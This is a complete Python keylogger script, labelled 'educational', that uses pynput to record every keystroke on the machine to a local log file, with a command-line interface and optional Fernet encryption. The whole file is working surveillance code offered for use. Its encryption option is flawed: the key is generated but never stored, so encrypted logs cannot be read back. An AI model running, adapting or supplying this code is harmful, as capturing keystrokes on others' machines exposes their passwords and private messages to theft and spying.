import os
import logging
import argparse
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

class EducationalKeylogger:
    def __init__(self, log_file="keylog.txt", encrypt=False):
        self.log_file = log_file
        self.encrypt = encrypt
        self.key = None
        
        if encrypt:
            self.key = Fernet.generate_key()
            self.cipher_suite = Fernet(self.key)
            
        # Set up logging
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format='%(asctime)s: %(message)s'
        )
        
    def on_press(self, key):
        try:
            # Handle alphanumeric keys
            char = key.char
        except AttributeError:
            # Handle special keys
            char = str(key)
            
        log_entry = f"Key pressed: {char}"
        
        if self.encrypt:
            encrypted_entry = self.cipher_suite.encrypt(log_entry.encode())
            logging.info(encrypted_entry)
        else:
            logging.info(log_entry)
            
    def start(self):
        print(f"[*] Keylogger started. Logging to {self.log_file}")
        print("[*] Press Ctrl+C to stop.")
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def main():
    parser = argparse.ArgumentParser(description="Educational Keylogger")
    parser.add_argument("--test", action="store_true", help="Run in test mode")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt log files")
    args = parser.parse_args()
    
    if args.test:
        print("[*] Running in TEST mode")
        log_file = f"test_keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    else:
        log_file = "keylog.txt"
    
    try:
        keylogger = EducationalKeylogger(log_file=log_file, encrypt=args.encrypt)
        keylogger.start()
    except KeyboardInterrupt:
        print("\n[*] Keylogger stopped")
    except Exception as e:
        print(f"[!] Error: {str(e)}")

if __name__ == "__main__":
    main() 